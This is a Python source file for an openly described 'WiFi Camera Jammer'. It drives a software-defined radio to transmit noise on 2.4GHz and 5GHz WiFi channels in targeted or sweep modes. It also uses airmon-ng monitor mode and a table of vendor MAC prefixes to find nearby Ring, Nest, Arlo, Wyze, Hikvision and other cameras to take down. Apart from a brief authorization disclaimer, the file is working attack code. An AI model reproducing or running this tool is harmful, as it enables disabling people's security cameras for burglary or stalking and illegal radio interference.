"""
WiFi Camera Jammer - Wireless Camera Takedown Attack

Jams WiFi cameras by transmitting noise on 2.4GHz and/or 5GHz bands.
Effective against most consumer wireless security cameras.

WARNING: This is a powerful attack tool. Use only with explicit authorization.
Unauthorized use is illegal and may violate federal communications regulations.
"""

import time
import threading
import subprocess
from typing import Optional, List, Callable, Dict
from dataclasses import dataclass
import logging
from collections import defaultdict

logger = logging.getLogger("CameraJammer")

try:
    from scapy.all import sniff, Dot11, Dot11Beacon, Dot11ProbeReq, Dot11ProbeResp, RadioTap
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    logger.warning("Scapy not available - camera detection limited")

@dataclass
class DetectedCamera:
    """Detected WiFi camera"""
    mac_address: str
    ssid: Optional[str]
    vendor: str
    channel: int
    signal_strength: int
    timestamp: float
    device_type: str = "Camera"

@dataclass
class WiFiChannel:
    """WiFi channel configuration"""
    number: int
    frequency_mhz: float
    bandwidth_mhz: float
    band: str  # "2.4GHz" or "5GHz"

class CameraJammer:
    """
    WiFi Camera Jamming Attack
    
    Modes:
    - Targeted: Jam specific WiFi channel(s)
    - Sweep: Rapidly cycle through all channels
    - Dual-Band: Jam both 2.4GHz and 5GHz simultaneously (requires 2 SDRs)
    
    Effectiveness:
    - WiFi cameras: 90%+ (will disconnect and fail to reconnect)
    - Cellular cameras: 0% (not affected)
    - Wired cameras: 0% (not affected)
    """
    
    # WiFi Channel Mappings
    CHANNELS_2_4GHZ = [
        WiFiChannel(1, 2412, 20, "2.4GHz"),
        WiFiChannel(6, 2437, 20, "2.4GHz"),
        WiFiChannel(11, 2462, 20, "2.4GHz"),
    ]
    
    CHANNELS_5GHZ = [
        WiFiChannel(36, 5180, 20, "5GHz"),
        WiFiChannel(40, 5200, 20, "5GHz"),
        WiFiChannel(44, 5220, 20, "5GHz"),
        WiFiChannel(48, 5240, 20, "5GHz"),
        WiFiChannel(149, 5745, 20, "5GHz"),
        WiFiChannel(153, 5765, 20, "5GHz"),
        WiFiChannel(157, 5785, 20, "5GHz"),
        WiFiChannel(161, 5805, 20, "5GHz"),
    ]
    
    # Camera vendor OUIs (MAC prefixes)
    CAMERA_VENDORS = {
        '00:12:c0': 'Nest/Google',
        '00:17:88': 'Philips/Hue',
        '18:b4:30': 'Nest',
        '64:16:66': 'Ring',
        '74:c6:3b': 'TP-Link Camera',
        'b0:4e:26': 'TP-Link',
        'ec:71:db': 'TP-Link',
        '00:62:6e': 'Wyze',
        '2c:aa:8e': 'Wyze',
        '7c:78:b2': 'Wyze',
        'd0:73:d5': 'Xiaomi/Mi Camera',
        '34:ce:00': 'Xiaomi',
        '78:11:dc': 'Xiaomi',
        '00:0e:58': 'Hikvision',
        '44:19:b6': 'Hikvision',
        'bc:ad:28': 'Hikvision',
        '00:12:12': 'Dahua',
        '08:7e:64': 'Arlo',
        'ac:57:75': 'Arlo',
        '00:03:7f': 'Atheros (cameras)',
        '4c:e1:73': 'Amcrest',
        '9c:8e:cd': 'Reolink',
        'ec:71:db': 'Reolink',
        '00:11:32': 'Synology (cameras)',
        '00:e0:4c': 'Axis (cameras)',
    }
    
    def __init__(self, sdr_controller=None, config: dict = None, wifi_interface: str = None):
        self.sdr = sdr_controller
        self.config = config or {}
        self.wifi_interface = wifi_interface or self.config.get('hardware', {}).get('wifi_adapter', 'wlan0')
        
        # Jamming state
        self.jamming = False
        self.jam_thread: Optional[threading.Thread] = None
        self.stop_event = threading.Event()
        
        # Camera detection state
        self.detecting = False
        self.detect_thread: Optional[threading.Thread] = None
        self.detected_cameras: List[DetectedCamera] = []
        self.camera_callback: Optional[Callable] = None
        
        # Configuration
        self.safety_timeout = self.config.get('camera_jamming', {}).get('safety_timeout', 60)
        self.tx_gain = self.config.get('camera_jamming', {}).get('power_level', 47)
        
        # Status callback
        self.status_callback: Optional[Callable] = None
        
        logger.info(f"Camera Jammer initialized (WiFi: {self.wifi_interface})")
        print(f"[Camera Jammer] Initialized (WiFi: {self.wifi_interface})")
    
    def start_jamming(self, band: str = "2.4GHz", channels: Optional[List[int]] = None, 
                     sweep: bool = False, timeout: Optional[int] = None):
        """
        Start WiFi jamming
        
        Args:
            band: "2.4GHz", "5GHz", or "both"
            channels: Specific channel numbers to jam (None = all common channels)
            sweep: If True, rapidly sweep through channels
            timeout: Auto-stop after N seconds (None = use default safety timeout)
        """
        if self.jamming:
            logger.warning("Already jamming - stop first")
            return False
        
        if not self.sdr or not self.sdr.is_open:
            logger.error("SDR not available")
            return False
        
        # Determine channels to jam
        target_channels = self._get_target_channels(band, channels)
        
        if not target_channels:
            logger.error(f"No valid channels for band: {band}")
            return False
        
        # Set timeout
        jam_timeout = timeout if timeout is not None else self.safety_timeout
        
        logger.warning(f"🎯 STARTING CAMERA JAM: {band} - {len(target_channels)} channels")
        logger.warning(f"⚠️  Safety timeout: {jam_timeout}s")
        print(f"[Camera] 🎯 STARTING JAM: {band} - {len(target_channels)} channels")
        print(f"[Camera] ⚠️  Safety timeout: {jam_timeout}s")
        
        self.jamming = True
        self.stop_event.clear()
        
        # Start jamming thread
        self.jam_thread = threading.Thread(
            target=self._jam_loop,
            args=(target_channels, sweep, jam_timeout),
            daemon=True
        )
        self.jam_thread.start()
        
        return True
    
    def stop_jamming(self):
        """Stop all jamming immediately"""
        if not self.jamming:
            return
        
        logger.warning("🛑 STOPPING CAMERA JAM")
        self.jamming = False
        self.stop_event.set()
        
        # Stop SDR jamming
        if self.sdr:
            self.sdr.stop_jamming()
        
        # Wait for thread
        if self.jam_thread:
            self.jam_thread.join(timeout=2.0)
        
        self._update_status("STOPPED", None, None)
        logger.info("Jamming stopped")

    def stop(self):
        """Unified stop for all camera jammer activities"""
        self.stop_jamming()
        self.stop_camera_detection()
    
    def _get_target_channels(self, band: str, channels: Optional[List[int]]) -> List[WiFiChannel]:
        """Get list of WiFi channels to jam"""
        all_channels = []
        
        if band in ["2.4GHz", "both"]:
            all_channels.extend(self.CHANNELS_2_4GHZ)
        
        if band in ["5GHz", "both"]:
            all_channels.extend(self.CHANNELS_5GHZ)
        
        # Filter by specific channel numbers if provided
        if channels:
            all_channels = [ch for ch in all_channels if ch.number in channels]
        
        return all_channels
    
    def _jam_loop(self, channels: List[WiFiChannel], sweep: bool, timeout: int):
        """Main jamming loop"""
        start_time = time.time()
        
        try:
            while self.jamming and not self.stop_event.is_set():
                # Check timeout
                if time.time() - start_time > timeout:
                    logger.warning(f"⏰ Safety timeout reached ({timeout}s) - stopping")
                    break
                
                if sweep:
                    # Sweep mode: rapidly cycle through all channels
                    for channel in channels:
                        if not self.jamming or self.stop_event.is_set():
                            break
                        
                        self._jam_channel(channel, duration=0.5)
                else:
                    # Static mode: jam all channels concurrently (or sequentially if one SDR)
                    # For single SDR, we'll jam each channel for longer periods
                    for channel in channels:
                        if not self.jamming or self.stop_event.is_set():
                            break
                        
                        self._jam_channel(channel, duration=2.0)
        
        except Exception as e:
            logger.error(f"Jamming loop error: {e}")
            import traceback
            traceback.print_exc()
        
        finally:
            self.jamming = False
            if self.sdr:
                self.sdr.stop_jamming()
    
    def _jam_channel(self, channel: WiFiChannel, duration: float):
        """Jam a specific WiFi channel"""
        freq_hz = channel.frequency_mhz * 1e6
        
        self._update_status("JAMMING", channel.band, channel.number)
        
        logger.info(f"📡 Jamming {channel.band} Channel {channel.number} ({channel.frequency_mhz} MHz)")
        
        # Start jamming on this frequency
        if self.sdr.start_jamming(freq_hz):
            # Hold for duration
            self.stop_event.wait(timeout=duration)
            
            # Stop (will restart on next channel if looping)
            self.sdr.stop_jamming()
        else:
            logger.error(f"Failed to jam channel {channel.number}")
    
    def _update_status(self, state: str, band: Optional[str], channel: Optional[int]):
        """Update status and notify callback"""
        status = {
            'state': state,
            'band': band,
            'channel': channel,
            'timestamp': time.time()
        }
        
        if self.status_callback:
            try:
                self.status_callback(status)
            except Exception as e:
                logger.error(f"Status callback error: {e}")
    
    def set_status_callback(self, callback: Callable):
        """Set callback for status updates"""
        self.status_callback = callback
    
    def is_jamming(self) -> bool:
        """Check if currently jamming"""
        return self.jamming
    
    def get_available_channels(self, band: str = "both") -> List[WiFiChannel]:
        """Get list of available WiFi channels"""
        return self._get_target_channels(band, None)
    
    def start_camera_detection(self, duration: int = 30, channel: Optional[int] = None):
        """
        Start WiFi camera detection using monitor mode
        
        Args:
            duration: Scan duration in seconds
            channel: Specific channel to monitor (None = scan all)
        """
        if self.detecting:
            logger.warning("Already detecting cameras")
            return False
        
        if not SCAPY_AVAILABLE:
            logger.error("Scapy required for camera detection")
            return False
        
        logger.info(f"🔍 Starting WiFi camera detection ({duration}s)")
        print(f"[Camera] 🔍 Starting WiFi camera detection ({duration}s)")
        
        # Enable monitor mode
        if not self._enable_monitor_mode():
            logger.error("Failed to enable monitor mode")
            return False
        
        self.detecting = True
        self.detected_cameras.clear()
        
        # Start detection thread
        self.detect_thread = threading.Thread(
            target=self._camera_detection_loop,
            args=(duration, channel),
            daemon=True
        )
        self.detect_thread.start()
        
        return True
    
    def stop_camera_detection(self):
        """Stop camera detection"""
        if not self.detecting:
            return
        
        logger.info("🛑 Stopping camera detection")
        self.detecting = False
        
        if self.detect_thread:
            self.detect_thread.join(timeout=3.0)
        
        # Disable monitor mode
        self._disable_monitor_mode()
        
        logger.info(f"Detection complete. Found {len(self.detected_cameras)} camera(s)")
    
    def _enable_monitor_mode(self) -> bool:
        """Enable monitor mode on WiFi interface using airmon-ng"""
        try:
            logger.info(f"Enabling monitor mode on {self.wifi_interface} using airmon-ng...")
            
            # Kill interfering processes
            subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'],
                         capture_output=True, timeout=5)
            
            # Start monitor mode
            result = subprocess.run(['sudo', 'airmon-ng', 'start', self.wifi_interface],
                         capture_output=True, text=True, timeout=5)
            
            if result.returncode == 0:
                # airmon-ng creates a new interface (e.g., wlan1mon)
                # Extract the monitor interface name from output
                output = result.stdout
                if 'monitor mode enabled' in output.lower() or 'monitor mode vif enabled' in output.lower():
                    # Try to find the monitor interface name
                    import re
                    match = re.search(r'(\w+mon)', output)
                    if match:
                        self.monitor_interface = match.group(1)
                        logger.info(f"Monitor mode enabled on {self.monitor_interface}")
                        print(f"[Camera] ✅ Monitor mode enabled on {self.monitor_interface}")
                    else:
                        # Fallback: assume interface name + "mon"
                        self.monitor_interface = self.wifi_interface + "mon"
                        logger.info(f"Monitor mode enabled (assuming {self.monitor_interface})")
                    return True
            
            logger.error(f"Failed to enable monitor mode: {result.stderr}")
            return False
        
        except subprocess.TimeoutExpired:
            logger.error("airmon-ng timed out")
            return False
        except Exception as e:
            logger.error(f"Failed to enable monitor mode: {e}")
            return False
    
    def _disable_monitor_mode(self):
        """Disable monitor mode and restore managed mode using airmon-ng"""
        try:
            if hasattr(self, 'monitor_interface'):
                logger.info(f"Disabling monitor mode on {self.monitor_interface}...")
                subprocess.run(['sudo', 'airmon-ng', 'stop', self.monitor_interface],
                             capture_output=True, timeout=5)
                logger.info("Monitor mode disabled")
            else:
                # Fallback to original interface
                subprocess.run(['sudo', 'airmon-ng', 'stop', self.wifi_interface],
                             capture_output=True, timeout=5)
        except Exception as e:
            logger.debug(f"Monitor mode disable error: {e}")
    
    def _camera_detection_loop(self, duration: int, channel: Optional[int]):
        """Camera detection loop using packet sniffing"""
        start_time = time.time()
        seen_macs = set()
        
        def packet_handler(pkt):
            """Process WiFi packets to detect cameras"""
            if not self.detecting or time.time() - start_time > duration:
                return True  # Stop sniffing
            
            try:
                # Check for Dot11 packets
                if not pkt.haslayer(Dot11):
                    return
                
                dot11 = pkt[Dot11]
                
                # Extract MAC addresses
                mac = None
                ssid = None
                
                # Get transmitter address
                if dot11.addr2:
                    mac = dot11.addr2.lower()
                
                # Extract SSID from beacons or probe responses
                if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
                    try:
                        ssid = pkt[Dot11].info.decode('utf-8', errors='ignore')
                    except:
                        pass
                
                # Check if this is a camera
                if mac and mac not in seen_macs:
                    vendor = self._identify_camera_vendor(mac)
                    
                    if vendor:
                        seen_macs.add(mac)
                        
                        # Extract signal strength if available
                        signal_strength = -100
                        if pkt.haslayer(RadioTap):
                            try:
                                signal_strength = pkt[RadioTap].dBm_AntSignal
                            except:
                                pass
                        
                        # Extract channel
                        pkt_channel = channel if channel else self._extract_channel(pkt)
                        
                        camera = DetectedCamera(
                            mac_address=mac,
                            ssid=ssid,
                            vendor=vendor,
                            channel=pkt_channel,
                            signal_strength=signal_strength,
                            timestamp=time.time()
                        )
                        
                        self.detected_cameras.append(camera)
                        logger.info(f"📷 Camera detected: {vendor} ({mac}) on channel {pkt_channel}")
                        print(f"[Camera] 📷 Detected: {vendor} ({mac}) on channel {pkt_channel}")
                        
                        # Notify callback
                        if self.camera_callback:
                            try:
                                self.camera_callback(camera)
                            except Exception as e:
                                logger.error(f"Camera callback error: {e}")
            
            except Exception as e:
                logger.debug(f"Packet processing error: {e}")
        
        try:
            logger.info("Sniffing WiFi packets...")
            
            # Use monitor interface if available, otherwise fallback to original
            sniff_interface = self.monitor_interface if hasattr(self, 'monitor_interface') else self.wifi_interface
            
            # Sniff packets
            sniff(
                iface=sniff_interface,
                prn=packet_handler,
                timeout=duration,
                store=False
            )
        
        except Exception as e:
            logger.error(f"Sniffing error: {e}")
        
        finally:
            self.detecting = False
    
    def _identify_camera_vendor(self, mac: str) -> Optional[str]:
        """Identify if MAC belongs to camera vendor"""
        mac_prefix = mac[:8]  # First 3 octets
        return self.CAMERA_VENDORS.get(mac_prefix)
    
    def _extract_channel(self, pkt) -> int:
        """Extract WiFi channel from packet"""
        try:
            if pkt.haslayer(RadioTap):
                # Try to extract channel from RadioTap
                freq = pkt[RadioTap].Channel
                if freq:
                    # Convert frequency to channel
                    if 2412 <= freq <= 2484:
                        return (freq - 2407) // 5
                    elif 5180 <= freq <= 5825:
                        return (freq - 5000) // 5
        except:
            pass
        
        return 1  # Default to channel 1
    
    def get_detected_cameras(self) -> List[DetectedCamera]:
        """Get list of detected cameras"""
        return self.detected_cameras.copy()
    
    def set_camera_callback(self, callback: Callable):
        """Set callback for camera detection events"""
        self.camera_callback = callback
    
    @staticmethod
    def get_wifi_channel_freq(channel: int) -> Optional[float]:
        """
        Convert WiFi channel number to frequency in MHz
        
        Args:
            channel: WiFi channel number (1-14 for 2.4GHz, 36-165 for 5GHz)
        
        Returns:
            Frequency in MHz or None if invalid
        """
        # 2.4 GHz channels (1-14)
        if 1 <= channel <= 14:
            return 2407 + (channel * 5)
        
        # 5 GHz channels
        if 36 <= channel <= 64:
            return 5000 + (channel * 5)
        if 100 <= channel <= 144:
            return 5000 + (channel * 5)
        if 149 <= channel <= 165:
            return 5000 + (channel * 5)
        
        return None
